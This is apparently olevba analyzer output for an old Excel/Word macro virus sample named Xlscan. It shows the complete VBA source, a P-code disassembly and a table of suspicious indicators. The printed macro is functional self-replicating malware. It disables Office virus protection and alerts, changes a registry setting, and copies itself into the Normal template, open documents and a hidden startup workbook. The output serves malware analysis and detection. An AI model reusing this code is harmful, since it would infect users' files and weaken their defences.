olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Xlscan.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.Xlscan.a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Xlscan.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Xlscan.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Xlscan.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Xlscan.bas 
in file: ./Virus.MSExcel.Xlscan.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Xlscan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function GetPrivateProfileStringA Lib "kernel32.dll" (ByVal lpSection As String, ByVal lpSetting As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileStringA Lib "kernel32.dll" (ByVal lpSection As String, ByVal lpSetting As String, ByVal lpValue As String, ByVal lpFileName As String) As Long
Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Global Const REG_DWORD As Long = 4
Global Const REG_SZ As Long = 1
Global Const HKEY_CURRENT_USER As Long = &H80000001
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Dim k As Long
Dim s As Long
Dim u As Long
Dim a As Long
Dim b As String

Sub Auto_Close()
On Error GoTo push_data
b = String(7, 0)
s = 256
v$ = String$(s, 0)

Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
u = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0, KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
u = RegCloseKey(k)
ShowVisualBasicEditor = False
Open "c:\Windows\System\Xlscan.386" For Input As 1
Close 1
GoTo god

push_data:
Application.VBE.ActiveVBProject.VBComponents("Xlscan").Export "c:\Windows\System\Xlscan.386"

god:
On Error GoTo god_1
If ActiveDocument = "" Then GoTo god_3
With Options
.VirusProtection = False
.ConfirmConversions = False
.SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Xlscan" Then r = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Xlscan" Then e = True
Next i
If e = False Then
With ActiveDocument.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
If r = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
End If
GoTo god_1

god_3:
If Dir(Application.StartupPath + "\Xlscan.xls") = "Xlscan.xls" Then p = True
For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Xlscan" Then t = True
Next i
If t = False Then
With ActiveWorkbook.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
End If
If p = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\Xlscan.xls"
With ActiveWorkbook.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
ActiveWindow.Visible = False
Workbooks("Xlscan.xls").Save
c = WritePrivateProfileStringA("Booting_index", "Windows_system", ".False.", "c:\Windows\System\Xlscan.idx")
End If
a = GetPrivateProfileStringA("Booting_index", "Windows_system", "", b, 255, "c:\Windows\System\Xlscan.idx")
If b = ".False." Then GoTo god_1

god_1:
On Error GoTo toend
Application.ScreenUpdating = True
end_ = Str((Month(Now()))) + Str((Day(Now()))) + Str((Hour(Now()))) + Str((Minute(Now()))) + Str((Second(Now())))
For save_file = 1 To 10
  Application.VBE.ActiveVBProject.VBComponents("Xlscan").Export "c:\Windows\System\" + end_ + Str(save_file) + ".vcx"
Next save_file

toend:
End Sub
Sub AutoOpen()
 ShowVisualBasicEditor = False
End Sub
Sub AutoExit()
Call Auto_Close
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub Auto_Open()
Application.OnSheetActivate = "Xlscan.Auto_Close"
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.Xlscan.a
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Лист1 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист2 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист3 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Xlscan - 8224 bytes
' Line #0:
' 	FuncDefn (Declare Function GetPrivateProfileStringA Lib "kernel32.dll" (ByVal lpSection As String, ByVal lpSetting As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long)
' Line #1:
' 	FuncDefn (Declare Function WritePrivateProfileStringA Lib "kernel32.dll" (ByVal lpSection As String, ByVal lpSetting As String, ByVal lpValue As String, ByVal lpFileName As String) As Long)
' Line #2:
' 	FuncDefn (Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #3:
' 	FuncDefn (Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long)
' Line #4:
' 	FuncDefn (Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #5:
' 	FuncDefn (Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long)
' Line #6:
' 	Dim (Global Const) 
' 	LitDI2 0x0004 
' 	VarDefn REG_DWORD (As Long)
' Line #7:
' 	Dim (Global Const) 
' 	LitDI2 0x0001 
' 	VarDefn REG_SZ (As Long)
' Line #8:
' 	Dim (Global Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #9:
' 	Dim (Global Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #10:
' 	Dim 
' 	VarDefn k (As Long)
' Line #11:
' 	Dim 
' 	VarDefn s (As Long)
' Line #12:
' 	Dim 
' 	VarDefn u (As Long)
' Line #13:
' 	Dim 
' 	VarDefn a (As Long)
' Line #14:
' 	Dim 
' 	VarDefn B (As String)
' Line #15:
' Line #16:
' 	FuncDefn (Sub Auto_Close())
' Line #17:
' 	OnError push_data 
' Line #18:
' 	LitDI2 0x0007 
' 	LitDI2 0x0000 
' 	ArgsLd String$ 0x0002 
' 	St B 
' Line #19:
' 	LitDI2 0x0100 
' 	St s 
' Line #20:
' 	Ld s 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St v$ 
' Line #21:
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #23:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #24:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #25:
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x0033 "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #26:
' 	Ld k 
' 	LitStr 0x0008 "Options6"
' 	LitDI2 0x0000 
' 	Ld REG_DWORD 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #27:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #28:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #29:
' 	LitStr 0x001C "c:\Windows\System\Xlscan.386"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Input)
' Line #30:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #31:
' 	GoTo god 
' Line #32:
' Line #33:
' 	Label push_data 
' Line #34:
' 	LitStr 0x001C "c:\Windows\System\Xlscan.386"
' 	LitStr 0x0006 "Xlscan"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' Line #36:
' 	Label god 
' Line #37:
' 	OnError god_1 
' Line #38:
' 	Ld ActiveDocument 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo god_3 
' 	EndIf 
' Line #39:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #42:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #43:
' 	EndWith 
' Line #44:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #46:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Xlscan"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St r 
' 	EndIf 
' Line #47:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #49:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Xlscan"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St e 
' 	EndIf 
' Line #50:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	Ld e 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #52:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #53:
' 	StartWithExpr 
' 	LitStr 0x001C "c:\Windows\System\Xlscan.386"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #54:
' 	EndWith 
' Line #55:
' 	EndWith 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld r 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #59:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #60:
' 	StartWithExpr 
' 	LitStr 0x001C "c:\Windows\System\Xlscan.386"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #61:
' 	EndWith 
' Line #62:
' 	EndWith 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	GoTo god_1 
' Line #65:
' Line #66:
' 	Label god_3 
' Line #67:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "\Xlscan.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x000A "Xlscan.xls"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St p 
' 	EndIf 
' Line #68:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #69:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Xlscan"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St t 
' 	EndIf 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	Ld t 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #72:
' 	StartWithExpr 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	With 
' Line #73:
' 	StartWithExpr 
' 	LitStr 0x001C "c:\Windows\System\Xlscan.386"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #74:
' 	EndWith 
' Line #75:
' 	EndWith 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	Ld p 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #78:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "\Xlscan.xls"
' 	Add 
' 	ParamNamed FileName 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0001 
' Line #79:
' 	StartWithExpr 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	With 
' Line #80:
' 	StartWithExpr 
' 	LitStr 0x001C "c:\Windows\System\Xlscan.386"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #81:
' 	EndWith 
' Line #82:
' 	EndWith 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #84:
' 	LitStr 0x000A "Xlscan.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' 	LitStr 0x000D "Booting_index"
' 	LitStr 0x000E "Windows_system"
' 	LitStr 0x0007 ".False."
' 	LitStr 0x001C "c:\Windows\System\Xlscan.idx"
' 	ArgsLd WritePrivateProfileStringA 0x0004 
' 	St c 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	LitStr 0x000D "Booting_index"
' 	LitStr 0x000E "Windows_system"
' 	LitStr 0x0000 ""
' 	Ld B 
' 	LitDI2 0x00FF 
' 	LitStr 0x001C "c:\Windows\System\Xlscan.idx"
' 	ArgsLd GetPrivateProfileStringA 0x0006 
' 	St a 
' Line #88:
' 	Ld B 
' 	LitStr 0x0007 ".False."
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo god_1 
' 	EndIf 
' Line #89:
' Line #90:
' 	Label god_1 
' Line #91:
' 	OnError toend 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #93:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Paren 
' 	ArgsLd Str 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	Paren 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	Paren 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Paren 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Paren 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St end_ 
' Line #94:
' 	StartForVariable 
' 	Ld save_file 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #95:
' 	LitStr 0x0012 "c:\Windows\System\"
' 	Ld end_ 
' 	Add 
' 	Ld save_file 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitStr 0x0004 ".vcx"
' 	Add 
' 	LitStr 0x0006 "Xlscan"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #96:
' 	StartForVariable 
' 	Ld save_file 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' Line #98:
' 	Label toend 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub AutoOpen())
' Line #101:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Sub AutoExit())
' Line #104:
' 	ArgsCall (Call) Auto_Close 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub ToolsMacro())
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub FileTemplates())
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub Auto_Open())
' Line #111:
' 	LitStr 0x0011 "Xlscan.Auto_Close"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #112:
' 	EndSub 
' Line #113:
' Line #114:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

